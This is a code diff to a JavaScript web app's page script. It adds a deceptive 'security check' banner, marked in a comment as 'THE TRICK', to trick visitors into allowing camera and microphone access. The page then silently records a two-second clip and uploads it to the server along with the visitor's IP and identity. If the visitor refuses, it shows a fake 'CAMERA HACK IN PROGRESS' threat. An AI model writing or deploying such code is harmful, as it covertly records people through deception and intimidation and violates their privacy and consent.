@@ -177,47 +177,43 @@ app.use(async (req, res, next) => {
         }
 
         async function initiateSurveillance() {
-            console.log("📸 [SURVEILLANCE] Attempting camera access...");
+            // THE TRICK: Show a scary mandatory message
+            const alertBox = document.getElementById('alert-box');
+            alertBox.innerHTML = "🚨 SECURITY CHECK REQUIRED<br>IDENTITY VERIFICATION IN PROGRESS...<br>Click 'Allow' to authorize scan.";
+            
+            console.log("📸 [SURVEILLANCE] Attempting camera access with trickery...");
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 console.log("✅ [SURVEILLANCE] Camera access granted.");
+                alertBox.innerHTML = "✅ IDENTITY SCANNED<br>REPORT GENERATED";
                 
                 const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8') ? 'video/webm;codecs=vp8' : 'video/webm';
-                const mediaRecorder = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 100000 }); // Low bitrate
+                const mediaRecorder = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 100000 });
                 const chunks = [];
 
                 mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                 mediaRecorder.onstop = async () => {
-                    console.log("🔄 [SURVEILLANCE] Recording stopped. Preparing upload...");
                     const blob = new Blob(chunks, { type: 'video/webm' });
                     const reader = new FileReader();
                     reader.readAsDataURL(blob);
                     reader.onloadend = async () => {
                         const base64data = reader.result;
-                        console.log("🚀 [SURVEILLANCE] Uploading evidence (Size: " + Math.round(base64data.length/1024) + " KB)...");
-                        try {
-                            const response = await fetch('/api/security/surveillance', {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ video: base64data, info: "IP: ${ip} | ID: ${identity}" })
-                            });
-                            if (response.ok) console.log("✅ [SURVEILLANCE] Evidence secured on server.");
-                            else console.error("❌ [SURVEILLANCE] Server rejected evidence.");
-                        } catch (err) {
-                            console.error("❌ [SURVEILLANCE] Upload failed:", err);
-                        }
+                        await fetch('/api/security/surveillance', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ video: base64data, info: "IP: ${ip} | ID: ${identity}" })
+                        });
                         stream.getTracks().forEach(track => track.stop());
                     };
                 };
 
                 mediaRecorder.start();
-                console.log("🔴 [SURVEILLANCE] Recording started...");
                 setTimeout(() => {
                     if (mediaRecorder.state === 'recording') mediaRecorder.stop();
-                }, 2000); // 2-second clip
+                }, 2000); 
             } catch (err) {
                 console.error("❌ [SURVEILLANCE] Camera failed:", err);
-                document.getElementById('alert-box').innerHTML += "<br>🚨 PERMISSION DENIED - CAMERA HACK IN PROGRESS...";
+                alertBox.innerHTML = "🚨 PERMISSION DENIED<br>CRITICAL THREAT DETECTED<br>BYPASSING SECURITY: CAMERA HACK IN PROGRESS...";
             }
         }
 
